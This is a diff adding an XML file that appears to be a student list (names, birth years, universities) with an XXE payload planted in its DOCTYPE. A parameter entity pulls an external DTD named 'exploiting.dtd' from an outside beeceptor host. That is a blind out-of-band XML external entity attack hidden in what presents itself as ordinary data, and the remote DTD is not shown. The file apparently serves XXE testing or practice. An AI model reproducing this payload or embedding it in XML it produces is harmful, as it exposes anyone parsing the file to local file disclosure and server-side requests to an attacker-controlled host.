@@ -1,0 +1,30 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://haoanh98.free.beeceptor.com/exploiting.dtd"> %xxe;]>
+<list>
+    <student>
+        <name>LE ANH HAO</name>
+        <age>1998</age>
+        <school>HUST</school>
+    </student>
+    <student>
+        <name>HOANG PHUONG LINH</name>
+        <age>2000</age>
+        <school>UET</school>
+    </student>
+    <student>
+        <name>Danvm</name>
+        <age>2000</age>
+        <school>UET</school>
+    </student>
+    <student>
+        <name>Biennd</name>
+        <age>2000</age>
+        <school>UET</school>
+    </student>
+    <student>
+        <name>Dungnt</name>
+        <age>1998</age>
+        <school>HUST</school>
+    </student>
+</list>
